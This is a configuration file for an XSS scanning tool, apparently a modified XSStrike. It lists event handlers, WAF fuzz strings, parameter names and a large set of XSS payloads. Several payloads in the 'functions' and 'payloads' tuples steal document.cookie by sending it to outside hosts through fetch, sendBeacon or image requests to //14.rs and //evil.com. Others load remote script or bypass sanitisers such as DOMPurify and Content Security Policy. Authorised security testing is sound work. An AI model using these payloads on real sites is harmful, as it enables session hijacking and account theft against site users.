changes = '''Negligible DOM XSS false positives;x10 faster crawling'''
globalVariables = {}  # it holds variables during runtime for collaboration across modules

defaultEditor = 'nano'
blindPayload = ''  # your blind XSS payload
xsschecker = 'v3dm0s'  # A non malicious string to check for reflections and stuff

#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
proxies = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}

minEfficiency = 90  # payloads below this efficiency will not be displayed

delay = 0  # default delay between http requests
use_browser = False  # set True with --browser flag to use DrissionPage (bypasses Cloudflare etc.)
threadCount = 10  # default number of threads
timeout = 10  # default number of http request timeout

# attributes that have special properties
specialAttributes = ['srcdoc', 'src']

badTags = ('iframe', 'title', 'textarea', 'noembed',
           'style', 'template', 'noscript')

tags = ('html', 'd3v', 'a', 'details')  # HTML Tags

# "Things" that can be used between js functions and breakers e.g. '};alert()//
jFillings = (';')
# "Things" that can be used before > e.g. <tag attr=value%0dx>
lFillings = ('', '%0dx')
# "Things" to use between event handler and = or between function and =
eFillings = ('%09', '%0a', '%0d',  '+')
fillings = ('%09', '%0a', '%0d', '/+/')  # "Things" to use instead of space

eventHandlers = {  # Event handlers and the tags compatible with them — v3.2 expanded
    # Toggle
    'ontoggle': ['details'],
    'onpopstate': ['body'],
    # Pointer events
    'onpointerenter': ['d3v', 'details', 'html', 'a', 'body'],
    'onpointerleave': ['d3v', 'details', 'html', 'a', 'body'],
    'onpointerdown': ['body', 'div', 'span', 'a'],
    'onpointerup': ['body', 'div', 'span', 'a'],
    # Mouse events
    'onmouseenter': ['body', 'div', 'span', 'a', 'img'],
    'onmouseleave': ['body', 'div', 'span', 'a', 'img'],
    'onmouseover': ['a', 'html', 'd3v', 'body', 'div', 'span', 'img'],
    'onmousemove': ['body', 'div', 'span'],
    'onmousedown': ['body', 'div', 'span', 'a'],
    'onmouseup': ['body', 'div', 'span', 'a'],
    # Form events
    'onbeforeinput': ['input', 'textarea'],
    'oninput': ['input', 'textarea'],
    'oninvalid': ['input', 'form'],
    'onfocus': ['input', 'button', 'select', 'textarea'],
    'onblur': ['input', 'button', 'select', 'textarea'],
    # Animation / transition (good for timing-based CSP bypass)
    'onanimationend': ['body', 'div', 'span', 'img'],
    'onanimationiteration': ['body', 'div', 'span'],
    'ontransitionend': ['body', 'div', 'span', 'a', 'img'],
    # Media
    'onplay': ['video', 'audio'],
    'onplaying': ['video', 'audio'],
    'onerror': ['img', 'video', 'audio', 'source', 'script'],
    'onload': ['body', 'img', 'script', 'iframe'],
    # Drag
    'ondragover': ['body', 'div'],
    'ondrop': ['body', 'div'],
    # Clipboard
    'oncopy': ['body'],
    'oncut': ['body'],
    'onpaste': ['input', 'textarea'],
    # Keyboard
    'onkeydown': ['body', 'input', 'textarea'],
    'onkeyup': ['body', 'input', 'textarea'],
    # Scroll / navigation
    'onscroll': ['body', 'div'],
    'onwheel': ['body', 'div'],
    # Message / storage (postMessage exploitation)
    'onmessage': ['iframe'],
    'onstorage': ['body'],
    # View
    'onresize': ['body', 'window'],
}

functions = (  # JavaScript functions for popup/exfil — v3.2 CSP-compatible
    # Standard popups (no CSP)
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\\u006efir\\u006d()',
    '(prompt)``', 'a=prompt,a()',
    # Navigator / iframe (bypass popup blockers)
    'open(location.href)',
    'frames[0].location=location.href',
    'window.name',
    'top.location',
    # Data exfil — fetch / beacon (CSP-friendly, no popup)
    'fetch(`//14.rs?c=${document.cookie}`)',
    'navigator.sendBeacon(`//14.rs`,document.cookie)',
    'new Image().src=`//14.rs?c=${document.cookie}`',
    'location=`//14.rs?c=${btoa(document.cookie)}`',
    # eval-based (when unsafe-eval is allowed by CSP)
    'eval(atob("YWxlcnQoMSk="))',
    'Function(atob("YWxlcnQoMSk="))()',
    # Service worker (advanced — works when SW registered)
    'navigator.serviceWorker.controller.postMessage(document.cookie)',
    # postMessage (if opener is controllable)
    'opener.postMessage(document.cookie,targetOrigin)',
    # WebRTC / fetch exfil
    'fetch(`//14.rs`,{method:"POST",body:document.cookie})',
)

payloads = (  # Payloads for filter & WAF evasion — v3.2 modernized
    # ── Original/Classic ──────────────────────────────────────────────────────
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    # ── Mutation XSS (mXSS) — bypass HTML sanitizers ─────────────────────────
    '<noscript><p title="</noscript><img src=x onerror=confirm(1)>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=confirm(1)>',
    '<svg><style><img src=x onerror=confirm(1)></style></svg>',
    '<svg><foreignObject><img src=x onerror=confirm(1)></foreignObject></svg>',
    '<math><maction actiontype="statusline#http://evil"><img src=x onerror=confirm(1)>',
    '<style><style/><img src=x onerror=confirm(1)></style>',
    # ── DOMPurify / Sanitizer bypass ──────────────────────────────────────────
    '<svg><p><style><g/onload=confirm(1)>',
    '<xmp><img src=x onerror=confirm(1)></xmp>',
    '<math><mtext><table><mglyph><style><!--</style><img src onerror=confirm(1)>-->',
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=confirm(1)>',
    '<svg><style><!--</style><img src onerror=confirm(1)>--></style></svg>',
    # ── CSP bypass — non-blocking imports / meta CSP override ────────────────
    '<link rel="import" href="//14.rs">',
    '<meta http-equiv="content-security-policy" content="script-src * \'unsafe-inline\'">',
    # ── JSONP / Callback exfil ───────────────────────────────────────────────
    'javascript:/*///*/?callback=alert(1)//',
    '<script src="//target.com/api?callback=alert(1)"></script>',
    '<script>var i=new Image();i.src=\'//evil.com/?c=\'+document.cookie</script>',
    '<script>function%20b(){confirm(1)};b()</script>',
    # ── Angular / React context ───────────────────────────────────────────────
    '<input autofocus onfocus=confirm(1)>',
    '<body onload=confirm(1)>',
    '<img src=x onerror=fetch(\'//14.rs?c=\'+btoa(document.cookie))>',
)

fuzzes = (  # Fuzz strings to test WAFs
    '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
    '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
    '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
    '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
    '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>')

headers = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message']
